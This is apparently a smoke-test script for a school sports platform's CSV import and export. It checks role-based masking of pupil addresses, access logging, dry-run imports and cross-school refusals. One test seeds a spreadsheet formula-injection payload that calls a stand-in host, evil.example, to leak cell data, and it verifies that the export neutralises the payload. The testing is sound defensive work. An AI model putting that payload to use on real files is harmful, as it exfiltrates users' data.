#!/usr/bin/env node
/**
 * CSV in and out — the unglamorous piece between a demo and a season.
 *
 * A school with four hundred boys will not type them in, and will not use a
 * platform they cannot get their data back out of. Both halves are here, and
 * the assertions are almost all about what does NOT happen:
 *
 *   1. AN EXPORT IS AN ORDINARY READ. Same rows, same masked columns, same
 *      access_log entry. A coach's file has no home addresses in it.
 *   2. DRY RUN IS THE DEFAULT, and a file with any error is never committed
 *      even when the caller asks for it.
 *   3. AN IMPORT IS A THOUSAND ORDINARY WRITES. Another school's id is
 *      refused by the same policy that refuses it on the screen.
 *   4. A SPREADSHEET CANNOT EXECUTE THE FILE.
 *
 *   node tools/migrate.mjs --reset --seed
 *   node tools/smoke-csv.mjs
 */
import { spawn } from "node:child_process";
import pg from "pg";

const PORT = 8835;
const BASE = `http://127.0.0.1:${PORT}`;
const DB = process.env.DATABASE_URL || "postgres://scrbrd:scrbrd@127.0.0.1:5432/scrbrd";
const HIL = "11111111-1111-1111-1111-111111111111";
const WES = "22222222-2222-2222-2222-222222222222";

let pass = 0, fail = 0;
const ok = (n, c) => { if (c) pass++; else { fail++; console.log("  ✗", n); } };
const group = (t) => console.log("\n" + t);

const server = spawn(process.execPath, ["services/api/server.mjs"], {
  env: { ...process.env, PORT: String(PORT), NODE_ENV: "development",
         ALLOW_DEV_LOGIN: "1", SESSION_SECRET: "smoke-csv-secret" },
  stdio: ["ignore", "pipe", "pipe"],
});
const serverErr = [];
server.stderr.on("data", (d) => serverErr.push(d.toString()));

const api = async (path, { method = "GET", token, body } = {}) => {
  const res = await fetch(BASE + path, {
    method,
    headers: { "content-type": "application/json", ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  return { status: res.status, body: await res.json().catch(() => null) };
};
const login = async (email) => (await api("/api/auth/dev-login", {
  method: "POST", body: { email, deviceId: "device-csv" } })).body?.token;

// The raw response, because an export is headers as much as it is a body.
const exportRaw = (resource, token, qs = "") =>
  fetch(`${BASE}/api/export/${resource}${qs}`,
        { headers: token ? { authorization: `Bearer ${token}` } : {} });
const exportCsv = async (resource, token, qs = "") => {
  const r = await exportRaw(resource, token, qs);
  return r.ok ? await r.text() : null;
};
const importCsv = (kind, token, body) =>
  api(`/api/import/${kind}`, { method: "POST", token, body });

const pool = new pg.Pool({ connectionString: DB });
const q = async (t, p) => (await pool.query(t, p)).rows;

try {
  for (let i = 0; i < 60; i++) {
    try { const r = await api("/api/health"); if (r.body?.db === "ok") break; } catch { /* not up */ }
    await new Promise((r) => setTimeout(r, 250));
  }

  const office = await login("registrar@example.invalid");  // player.profile.manage + pii
  const coach  = await login("coach@example.invalid");       // 1XI, no pii
  const medic  = await login("medical@example.invalid");
  const parent = await login("parent@example.invalid");
  const wesAdmin = await login("registrar.wes@example.invalid");

  group("An export is an ordinary read, wearing a filename");
  {
    const r = await exportRaw("players", office);
    ok("it answers", r.status === 200);
    ok("...as a CSV", /text\/csv/.test(r.headers.get("content-type") ?? ""));
    ok("...as a download", /attachment/.test(r.headers.get("content-disposition") ?? ""));
    ok("...with the day in the filename, so two terms' files differ",
       new RegExp(new Date().toISOString().slice(0, 10)).test(r.headers.get("content-disposition") ?? ""));
    ok("...and the row count as a header",
       Number(r.headers.get("x-scrbrd-rows")) > 0);
    // The BYTES, not the decoded text. fetch's .text() performs a UTF-8 decode
    // that strips a leading BOM by specification, so reading the string can
    // never see it — the first version of this assertion failed against a file
    // that was correct.
    const bytes = new Uint8Array(await (await exportRaw("players", office)).arrayBuffer());
    ok("a BOM leads it, so Excel reads UTF-8",
       bytes[0] === 0xef && bytes[1] === 0xbb && bytes[2] === 0xbf);
    const csv = await r.text();
    ok("there is a header row", /full_name/.test(csv));
    ok("...and a real player in it", /Botha|Pillay|Whitfield/.test(csv));
    ok("an unauthenticated caller gets nothing",
       [401, 403].includes((await exportRaw("players")).status));
    ok("an unknown resource is a 404", (await exportRaw("nonsense", office)).status === 404);
  }

  group("THE SAME MASKING, because it is the same read");
  {
    // The whole architectural claim. If an export took a fast path straight to
    // the table, this is the assertion that would fail — and the first person
    // to notice would be a coach holding a spreadsheet of every pupil's home
    // address.
    await q(`update player set address = $2, id_number = $3 where id = $1`,
            ["aaaaaaaa-0000-0000-0000-000000000005",
             "14 Ridge Road, Hilton", "1104075800086"]);
    const asOffice = await exportCsv("players", office);
    const asCoach  = await exportCsv("players", coach);
    ok("the office, who holds player.pii.read, gets the address",
       asOffice.includes("14 Ridge Road"));
    ok("...and the identity number", asOffice.includes("1104075800086"));
    ok("THE COACH'S FILE HAS NO ADDRESS IN IT", !asCoach.includes("14 Ridge Road"));
    ok("...and no identity number", !asCoach.includes("1104075800086"));
    ok("...but does have the roster they may see", /Pillay|Botha/.test(asCoach));
    // A module switched off closes the export too, because it closes the read.
    await api("/api/admin/modules/injuries/suppress", { method: "POST", token: office,
      body: { schoolId: HIL, hidden: true, reason: "CSV walk." } });
    ok("a switched-off module refuses its export", (await exportRaw("injuries", medic)).status === 403);
    await api("/api/admin/modules/injuries/suppress", { method: "POST", token: office,
      body: { schoolId: HIL, hidden: false } });
    ok("...and serves it again once back on", (await exportRaw("injuries", medic)).status === 200);
  }

  group("A restricted read is logged, whether it is a screen or a file");
  {
    const before = (await q(`select count(*)::int c from access_log`))[0].c;
    await exportCsv("players", office);
    const after = (await q(`select count(*)::int c from access_log`))[0].c;
    // An export is a disclosure. If it were not logged, the way to read four
    // hundred children's records without a trace would be to download them.
    ok("the export left an entry", after > before);
    ok("...naming the resource",
       (await q(`select resource from access_log order by occurred_at desc limit 1`))[0].resource === "players");
  }

  group("A cell is a program, and the file must be safe to open");
  {
    // Excel, Numbers and LibreOffice all evaluate a cell beginning = + - or @.
    await q(`update player set hometown = $2 where id = $1`,
            ["aaaaaaaa-0000-0000-0000-000000000005",
             '=HYPERLINK("http://evil.example/?"&A1,"click")']);
    const csv = await exportCsv("players", office);
    ok("the formula is in the file, as text", csv.includes("HYPERLINK"));
    // THE ASSERTION. Not "no formula" — a neutralised one, with the leading
    // apostrophe every spreadsheet reads as "this is text".
    ok("...neutralised with a leading apostrophe", /'=HYPERLINK/.test(csv));
    ok("...and it is not a live formula", !/(^|,)=HYPERLINK/m.test(csv));
    await q(`update player set hometown = 'Hilton' where id = $1`,
            ["aaaaaaaa-0000-0000-0000-000000000005"]);
  }

  group("A template is given, not documented");
  {
    const r = await fetch(`${BASE}/api/import/players/template`);
    ok("the template downloads", r.status === 200);
    const t = await r.text();
    ok("...with the columns to fill in", /full_name,team_code/.test(t));
    // An empty template teaches nothing about the date format, which is the
    // field schools get wrong.
    ok("...and an example row showing the date format", /2011-04-07/.test(t));
    ok("an unknown kind is a 404",
       (await fetch(`${BASE}/api/import/nonsense/template`)).status === 404);
  }

  group("Dry run is the default");
  {
    const csv = "full_name,team_code,born\nNew Boy One,U15A,2011-04-07\nNew Boy Two,U15A,2011-06-01\n";
    const dry = await importCsv("players", office, { csv, schoolId: HIL });
    ok("a clean file validates", dry.status === 200 && dry.body?.clean === true);
    ok("...and says what it would insert", dry.body?.wouldInsert === 2);
    ok("...and that it committed nothing", dry.body?.committed === false);
    // THE POINT. Nothing was written by a validation pass.
    ok("NOTHING WAS WRITTEN",
       (await q(`select count(*)::int c from player where full_name like 'New Boy%'`))[0].c === 0);

    const done = await importCsv("players", office, { csv, schoolId: HIL, commit: true });
    ok("committing writes them", done.body?.committed === true && done.body?.inserted === 2);
    ok("...and they are there",
       (await q(`select count(*)::int c from player where full_name like 'New Boy%'`))[0].c === 2);
    ok("...with the fields as given",
       (await q(`select born, team_code from player where full_name = 'New Boy One'`))[0].team_code === "U15A");

    // Re-running the same file updates rather than duplicates: a school WILL
    // send the corrected version of the same spreadsheet.
    const again = await importCsv("players", office, { csv, schoolId: HIL, commit: true });
    ok("re-running the file updates rather than duplicates", again.body?.updated === 2);
    ok("...and adds nobody", again.body?.inserted === 0);
    ok("...so the count is unchanged",
       (await q(`select count(*)::int c from player where full_name like 'New Boy%'`))[0].c === 2);

    // A blank cell means "not in this file", never "delete this".
    await importCsv("players", office, {
      csv: "full_name,team_code\nNew Boy One,\n", schoolId: HIL, commit: true });
    ok("a blank cell does not erase what was there",
       (await q(`select team_code from player where full_name = 'New Boy One'`))[0].team_code === "U15A");
  }

  group("Every mistake at once, with the line numbers from their spreadsheet");
  {
    const messy =
      "full_name,team_code,born,squad_no\n" +
      "Good Boy,U15A,2011-04-07,7\n" +          // line 2
      ",U15A,2011-04-07,8\n" +                  // line 3 — no name
      "Bad Date,U15A,07/04/2011,9\n" +          // line 4 — ambiguous
      "Bad Number,U15A,2011-04-07,0\n" +        // line 5 — out of range
      "Bad Real,U15A,2011-02-30,10\n";          // line 6 — not a real date
    const r = await importCsv("players", office, { csv: messy, schoolId: HIL });
    ok("the report comes back", r.status === 200);
    ok("...not clean", r.body?.clean === false);
    ok("...with four errors, all at once", r.body?.errors?.length === 4);
    const at = (n) => r.body.errors.find((e) => e.line === n);
    ok("line 3 says the name is required", /required/.test(at(3)?.message ?? ""));
    // The one that matters: 07/04/2011 is 7 April here and 4 July in the
    // United States, and a silent guess puts a boy in the wrong age group.
    ok("line 4 REFUSES the ambiguous date rather than guessing",
       /ambiguous/.test(at(4)?.message ?? ""));
    ok("line 5 names the range", /at least 1/.test(at(5)?.message ?? ""));
    ok("line 6 says the date is not real", /not a real date/.test(at(6)?.message ?? ""));

    // A FILE WITH ANY ERROR IS NEVER COMMITTED, even when asked. Not even the
    // good row.
    const forced = await importCsv("players", office, { csv: messy, schoolId: HIL, commit: true });
    ok("commit is refused while any row is bad", forced.body?.committed === false);
    ok("...and even the good row was not written",
       (await q(`select count(*)::int c from player where full_name = 'Good Boy'`))[0].c === 0);
  }

  group("An import is a thousand ordinary writes");
  {
    const csv = "full_name,team_code\nSomebody Else,1XI\n";
    // The same policy that refuses them on the screen.
    const cross = await importCsv("players", wesAdmin, { csv, schoolId: HIL, commit: true });
    ok("another school's office cannot import into this one",
       cross.status === 403 || cross.body?.committed === false);
    ok("...and nothing landed",
       (await q(`select count(*)::int c from player
                  where full_name = 'Somebody Else' and school_id = $1`, [HIL]))[0].c === 0);
    ok("a coach cannot import at all",
       (await importCsv("players", coach, { csv, schoolId: HIL, commit: true })).body?.committed !== true);
    ok("nor a parent",
       (await importCsv("players", parent, { csv, schoolId: HIL, commit: true })).body?.committed !== true);
    ok("...and the refusal is reported per row, not as a crash",
       Array.isArray((await importCsv("players", coach, { csv, schoolId: HIL })).body?.errors));
    ok("their own school is fine",
       (await importCsv("players", wesAdmin, { csv, schoolId: WES, commit: true }))
         .body?.committed === true);
  }

  group("The file has to be a file, and the school has to be named");
  {
    ok("no csv is refused",
       (await importCsv("players", office, { schoolId: HIL })).status === 400);
    ok("no school is refused",
       (await importCsv("players", office, { csv: "full_name\nA\n" })).status === 400);
    ok("an unknown kind is a 404",
       (await importCsv("nonsense", office, { csv: "a\n1\n", schoolId: HIL })).status === 404);
    ok("a file with no name column fails once, not per row",
       (await importCsv("players", office, { csv: "team_code\n1XI\n", schoolId: HIL }))
         .body?.errors?.length === 1);
    // Not an error: a school's export carries fifty columns and we want ten.
    const extra = await importCsv("players", office, {
      csv: "full_name,house,nickname\nExtra Cols,Founders,Bots\n", schoolId: HIL });
    ok("unused columns are reported, not rejected",
       extra.body?.clean === true && extra.body?.unknownColumns?.length === 2);
  }

  group("Two boys with one name is refused, not guessed");
  {
    // Deliberately NOT a unique constraint on the name — two boys called
    // A Botha at one school is unusual and it happens, and a schema forbidding
    // it would make the second unenterable by any route. So the import says it
    // cannot tell them apart, and the person reading the file could not either.
    await q(`insert into player (school_id, full_name, team_code, fitness)
             values ($1,'Twin Name','U15A','fit'), ($1,'Twin Name','U15B','fit')`, [HIL]);
    const r = await importCsv("players", office, {
      csv: "full_name,team_code\nTwin Name,1XI\n", schoolId: HIL, commit: true });
    ok("the row is refused", r.body?.committed === false);
    ok("...saying it cannot tell them apart",
       /cannot tell them apart/.test(r.body?.errors?.[0]?.message ?? ""));
    ok("...and neither was changed",
       (await q(`select count(*)::int c from player
                  where full_name = 'Twin Name' and team_code = '1XI'`))[0].c === 0);
  }

  group("A round trip");
  {
    // The real test of a pair of tools: what comes out goes back in.
    const out = await exportCsv("players", office);
    const back = await importCsv("players", office, { csv: out, schoolId: HIL });
    // Not asserted clean — the export carries columns the import does not
    // read, and ids and computed fields among them. What matters is that the
    // NAMES round-trip and nothing is silently mangled.
    ok("the export parses as an import", back.status === 200);
    ok("...and every row is recognised", back.body?.rows > 0);
    // THE CLAIM IS THAT NOTHING DUPLICATES. Not that every row updates: this
    // walk deliberately created two boys called Twin Name above, and the
    // import correctly refuses to guess between them — so a strict
    // wouldUpdate === rows would fail on a fixture the walk built itself.
    ok("...duplicating nobody", back.body?.wouldInsert === 0);
    ok("...and matching almost all of them",
       back.body?.wouldUpdate >= back.body?.rows - 2);
    ok("...with the only refusals being the twins it cannot tell apart",
       (back.body?.errors ?? []).every((e) => /cannot tell them apart/.test(e.message)));
  }

} catch (e) {
  fail++; console.log("\n  ✗ threw:", e.message);
  if (serverErr.length) console.log(serverErr.join("").slice(-2000));
} finally {
  await pool.end().catch(() => {});
  server.kill();
  console.log("\n" + "─".repeat(52));
  console.log(`CSV SMOKE: ${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
}
